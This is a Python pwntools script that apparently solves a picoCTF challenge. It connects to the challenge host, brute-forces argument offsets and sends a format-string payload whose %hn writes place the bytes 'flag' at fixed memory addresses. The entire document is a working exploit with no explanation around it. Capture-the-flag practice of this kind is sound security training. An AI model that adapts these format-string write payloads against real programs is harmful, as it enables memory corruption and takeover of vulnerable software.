from pwn import *

HOST = "rhea.picoctf.net"
PORT = 59822

sus_1 = p64(0x404060)
sus_2 = p64(0x404062)
val_1 = 0x6c66
val_2 = 0x6761

for offset in range(1, 19):
    challenge = remote(HOST, PORT)
    try:
        payload = b'%' + str(val_1).encode() + b'c%' + str(offset).encode() + b'$hn'
        payload += b'%' + str((val_2 - val_1) % 0x10000).encode() + b'c%' + str(offset + 1).encode() + b'$hn'
        payload += b'A' * ((8 - len(payload) % 8) % 8)
        payload += sus_1 + sus_2

        challenge.sendlineafter(b'?\n', payload)
        try:
            response = challenge.recvall(timeout=1)
        except EOFError:
            response = b''
        print(f"Offset {offset}: {response.decode(errors='ignore')}")
    finally:
        challenge.close()
